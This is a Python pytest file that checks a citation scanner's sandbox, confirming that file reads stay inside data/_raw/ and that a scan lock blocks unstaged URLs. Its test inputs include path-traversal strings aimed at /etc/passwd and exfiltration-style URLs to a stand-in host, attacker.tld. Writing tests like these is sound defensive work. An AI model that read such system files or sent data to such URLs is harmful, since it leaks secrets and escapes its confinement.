"""The scan session can't read outside data/_raw/ or fetch an unstaged URL."""

from __future__ import annotations

import common
import pytest
import verify_citations

REAL_FETCH = common.fetch_readable  # captured before the sandbox fixture stubs it


def test_raw_file_stays_inside_data_raw(sandbox):
    (sandbox / "data/_raw").mkdir()
    (sandbox / "data/_raw/c1.txt").write_text("body")
    assert common.raw_file("data/_raw/c1.txt") == (sandbox / "data/_raw/c1.txt").resolve()
    for escape in ("/etc/passwd", "data/_raw/../../../etc/passwd", "config.yaml", "", None):
        assert common.raw_file(escape) is None


def test_grounding_never_reads_an_absolute_raw_path(sandbox, tmp_path):
    secret = tmp_path / "outside-secret.txt"
    secret.write_text("hunter2")
    entry = {"raw_path": str(secret), "article_url": "manual:none"}
    assert verify_citations.source_text_for(entry) is None


def test_scan_lock_allows_only_snapshot_urls(sandbox, monkeypatch):
    common.save_json(sandbox / "data" / common.SCAN_URL_SNAPSHOT, {"c1": "https://ok.example/a"})
    common.check_scan_lock("https://attacker.tld/?d=x")  # unlocked: anything goes
    monkeypatch.setenv(common.SCAN_LOCK_ENV, "1")
    common.check_scan_lock("https://ok.example/a")
    with pytest.raises(PermissionError):
        common.check_scan_lock("https://attacker.tld/?d=x")


def test_locked_fetch_refuses_before_any_request(sandbox, monkeypatch):
    import requests

    def no_network(*a, **k):
        raise AssertionError("network reached: the scan lock did not run first")

    monkeypatch.setattr(requests, "get", no_network)
    monkeypatch.setenv(common.SCAN_LOCK_ENV, "1")
    with pytest.raises(PermissionError):
        REAL_FETCH("https://attacker.tld/?d=secret")


def test_tampered_entry_is_ungrounded_under_the_lock(sandbox, monkeypatch):
    entry = {
        "raw_path": "/etc/hosts",
        "article_url": "https://attacker.tld/?d=x",
        "lessons": [{"point": "p", "excerpt": "an invented quote"}],
    }
    unlocked = verify_citations.ground_entry(json_copy(entry))
    assert unlocked["grounding_score"] is None  # outside a scan: unverifiable, as before
    monkeypatch.setenv(common.SCAN_LOCK_ENV, "1")
    locked = verify_citations.ground_entry(json_copy(entry))
    assert locked["grounding_score"] == 0.0 and not verify_citations.fully_grounded(locked)


def json_copy(d: dict) -> dict:
    import json

    return json.loads(json.dumps(d))


def test_published_entries_keep_their_grounding_under_the_lock(sandbox, monkeypatch):
    """Regression: re-grounding the pools mid-scan must not demote old entries,
    whose raw text isn't staged and whose URLs sit outside the lock."""
    monkeypatch.setattr(common, "main_entry_ids", lambda: {"old-1"})
    monkeypatch.setenv(common.SCAN_LOCK_ENV, "1")
    lessons = [{"point": "p", "excerpt": "quoted", "grounded": True}]
    old = {"id": "old-1", "article_url": "https://elsewhere.example/x", "grounding_score": 1.0}
    old["lessons"] = lessons
    kept = verify_citations.ground_entry(json_copy(old))
    assert kept["grounding_score"] == 1.0 and verify_citations.fully_grounded(kept)
    new = {**json_copy(old), "id": "new-1"}
    assert verify_citations.ground_entry(new)["grounding_score"] == 0.0
